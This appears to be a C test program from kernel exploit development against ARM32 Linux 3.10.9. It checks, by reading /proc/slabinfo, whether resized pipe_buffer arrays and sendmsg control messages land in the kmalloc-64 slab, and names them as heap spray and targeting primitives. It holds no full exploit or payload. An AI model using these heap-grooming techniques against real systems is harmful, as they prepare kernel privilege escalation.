/*
 * pipe_slab_test.c — Verify pipe_buffer placement in kmalloc-64
 *
 * On ARM32 kernel 3.10, struct pipe_buffer ≈ 24 bytes.
 * With F_SETPIPE_SZ we can control the number of pipe buffers:
 *   2 buffers → kmalloc(48) → kmalloc-64  ← target!
 *   1 buffer  → kmalloc(24) → kmalloc-32
 *
 * pipe_buffer contains ops (const struct pipe_buf_operations *) —
 * a function pointer table called on read/splice/close.
 *
 * Also tests sendmsg cmsg as persistent kmalloc-64 spray.
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/uio.h>

#define PAGE_SIZE 4096

/* Read /proc/slabinfo for kmalloc-64 active objects */
static int read_slab_count(const char *slab_name) {
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512];
    int count = -1;
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, slab_name)) {
            /* Format: name active_objs num_objs ... */
            char name[64];
            int active;
            if (sscanf(line, "%63s %d", name, &active) == 2)
                count = active;
            break;
        }
    }
    fclose(f);
    return count;
}

/* ============================================================ */
/* TEST 1: pipe_buffer placement via F_SETPIPE_SZ               */
/* ============================================================ */
static void test_pipe_buffer_slab(void) {
    fprintf(stderr, "\n=== TEST 1: pipe_buffer slab placement ===\n");

    int baseline = read_slab_count("kmalloc-64");
    fprintf(stderr, "[*] Baseline kmalloc-64: %d\n", baseline);

    /* Create pipes and resize them to get 2-buffer arrays in kmalloc-64 */
    int pipes[200][2];
    int created = 0;

    for (int i = 0; i < 200; i++) {
        if (pipe(pipes[i]) < 0) {
            fprintf(stderr, "[-] pipe() failed at %d: %s\n", i, strerror(errno));
            break;
        }

        /* Try to set pipe size to minimum (1 page = 1 buffer) */
        int ret = fcntl(pipes[i][0], F_SETPIPE_SZ, PAGE_SIZE);
        if (ret < 0 && i == 0) {
            fprintf(stderr, "[-] F_SETPIPE_SZ failed: %s\n", strerror(errno));
            close(pipes[i][0]);
            close(pipes[i][1]);
            break;
        }
        created++;
    }

    int after1 = read_slab_count("kmalloc-64");
    fprintf(stderr, "[*] After %d pipes (1-page): kmalloc-64 = %d (delta: %d)\n",
            created, after1, after1 - baseline);

    /* Close and retry with 2-page pipes */
    for (int i = 0; i < created; i++) {
        close(pipes[i][0]);
        close(pipes[i][1]);
    }

    int after_close = read_slab_count("kmalloc-64");
    fprintf(stderr, "[*] After close: kmalloc-64 = %d (delta from baseline: %d)\n",
            after_close, after_close - baseline);

    /* Now try 2-page pipe (should allocate pipe_buffer[2] = 48 bytes → kmalloc-64) */
    created = 0;
    for (int i = 0; i < 200; i++) {
        if (pipe(pipes[i]) < 0) break;
        int ret = fcntl(pipes[i][0], F_SETPIPE_SZ, PAGE_SIZE * 2);
        if (ret < 0 && i == 0) {
            fprintf(stderr, "[-] F_SETPIPE_SZ(2*PAGE) failed: %s\n", strerror(errno));
            close(pipes[i][0]);
            close(pipes[i][1]);
            break;
        }
        created++;
    }

    int after2 = read_slab_count("kmalloc-64");
    fprintf(stderr, "[*] After %d pipes (2-page): kmalloc-64 = %d (delta: %d)\n",
            created, after2, after2 - after_close);

    /* Check if 2-page pipes allocate in kmalloc-64 */
    if (after2 - after_close >= created/2) {
        fprintf(stderr, "[!] pipe_buffer[2] CONFIRMED in kmalloc-64! "
                "(+%d objects for %d pipes)\n", after2 - after_close, created);
    } else {
        fprintf(stderr, "[*] pipe_buffer[2] NOT in kmalloc-64 "
                "(only +%d for %d pipes)\n", after2 - after_close, created);
    }

    /* Also check what the actual pipe size became */
    if (created > 0) {
        int actual = fcntl(pipes[0][0], F_GETPIPE_SZ);
        fprintf(stderr, "[*] Actual pipe size after F_SETPIPE_SZ(2*PAGE): %d bytes "
                "(%d pages, %d buffers)\n",
                actual, actual / PAGE_SIZE, actual / PAGE_SIZE);
    }

    /* Try other sizes to find the sweet spot */
    for (int i = 0; i < created; i++) {
        close(pipes[i][0]);
        close(pipes[i][1]);
    }

    /* Test various pipe sizes */
    int test_sizes[] = { 1, 2, 3, 4, 8, 16 };
    for (int s = 0; s < (int)(sizeof(test_sizes)/sizeof(test_sizes[0])); s++) {
        int base = read_slab_count("kmalloc-64");
        int base32 = read_slab_count("kmalloc-32");
        int base128 = read_slab_count("kmalloc-128");

        created = 0;
        for (int i = 0; i < 100; i++) {
            if (pipe(pipes[i]) < 0) break;
            fcntl(pipes[i][0], F_SETPIPE_SZ, PAGE_SIZE * test_sizes[s]);
            created++;
        }

        int d64 = read_slab_count("kmalloc-64") - base;
        int d32 = read_slab_count("kmalloc-32") - base32;
        int d128 = read_slab_count("kmalloc-128") - base128;

        fprintf(stderr, "[*] %d pipes × %d pages: k32=%+d k64=%+d k128=%+d\n",
                created, test_sizes[s], d32, d64, d128);

        for (int i = 0; i < created; i++) {
            close(pipes[i][0]);
            close(pipes[i][1]);
        }
    }
}

/* ============================================================ */
/* TEST 2: sendmsg cmsg as persistent kmalloc spray              */
/* ============================================================ */
static void test_sendmsg_spray(void) {
    fprintf(stderr, "\n=== TEST 2: sendmsg cmsg persistent spray ===\n");

    /* Create a unix socket pair */
    int sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
        fprintf(stderr, "[-] socketpair: %s\n", strerror(errno));
        return;
    }

    /* Set small send buffer to make blocking easier */
    int sndbuf = 4096;
    setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    /* Fill the socket buffer to make send block */
    char fillbuf[4096];
    memset(fillbuf, 'A', sizeof(fillbuf));
    int filled = 0;

    /* Set non-blocking to fill without blocking */
    int flags = fcntl(sv[0], F_GETFL);
    fcntl(sv[0], F_SETFL, flags | O_NONBLOCK);
    while (send(sv[0], fillbuf, sizeof(fillbuf), MSG_DONTWAIT) > 0)
        filled++;
    fcntl(sv[0], F_SETFL, flags); /* restore blocking */
    fprintf(stderr, "[*] Filled socket buffer with %d sends\n", filled);

    /* Check baseline */
    int baseline = read_slab_count("kmalloc-64");
    fprintf(stderr, "[*] Baseline kmalloc-64: %d\n", baseline);

    /* Now try sendmsg with msg_control of size 64 in a blocking thread */
    /* Since we can't easily do threads in a simple test, just verify the
       cmsg allocation size */
    fprintf(stderr, "[*] Testing cmsg allocation sizes...\n");

    /* Use a separate socketpair for cmsg testing */
    int csv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, csv) < 0) {
        fprintf(stderr, "[-] socketpair: %s\n", strerror(errno));
        close(sv[0]); close(sv[1]);
        return;
    }

    /* Send messages with various cmsg sizes */
    int cmsg_sizes[] = { 16, 32, 48, 64, 96, 128 };
    for (int s = 0; s < (int)(sizeof(cmsg_sizes)/sizeof(cmsg_sizes[0])); s++) {
        int base = read_slab_count("kmalloc-64");
        int base32 = read_slab_count("kmalloc-32");
        int base128 = read_slab_count("kmalloc-128");

        int count = 100;
        for (int i = 0; i < count; i++) {
            char data = 'X';
            struct iovec iov = { .iov_base = &data, .iov_len = 1 };

            char *ctrl = calloc(1, cmsg_sizes[s]);
            struct msghdr msg = {
                .msg_iov = &iov,
                .msg_iovlen = 1,
                .msg_control = ctrl,
                .msg_controllen = cmsg_sizes[s],
            };

            /* Fill cmsg header */
            struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
            if (cmsg) {
                cmsg->cmsg_level = SOL_SOCKET;
                cmsg->cmsg_type = SCM_RIGHTS;
                cmsg->cmsg_len = CMSG_LEN(sizeof(int));
                *(int*)CMSG_DATA(cmsg) = csv[0]; /* pass an fd */
            }

            sendmsg(csv[0], &msg, MSG_DONTWAIT);
            free(ctrl);

            /* Drain from receiver */
            char rbuf[64];
            struct iovec riov = { .iov_base = rbuf, .iov_len = sizeof(rbuf) };
            char rctrl[256];
            struct msghdr rmsg = {
                .msg_iov = &riov,
                .msg_iovlen = 1,
                .msg_control = rctrl,
                .msg_controllen = sizeof(rctrl),
            };
            recvmsg(csv[1], &rmsg, MSG_DONTWAIT);
        }

        int d64 = read_slab_count("kmalloc-64") - base;
        int d32 = read_slab_count("kmalloc-32") - base32;
        int d128 = read_slab_count("kmalloc-128") - base128;

        fprintf(stderr, "[*] cmsg_size=%d × %d: k32=%+d k64=%+d k128=%+d\n",
                cmsg_sizes[s], count, d32, d64, d128);
    }

    close(csv[0]); close(csv[1]);
    close(sv[0]); close(sv[1]);
}

int main(void) {
    fprintf(stderr, "=== Pipe Buffer & Sendmsg Slab Test ===\n");
    fprintf(stderr, "Target: kernel 3.10.9, ARM32\n\n");

    test_pipe_buffer_slab();
    test_sendmsg_spray();

    fprintf(stderr, "\n=== All tests complete ===\n");
    return 0;
}
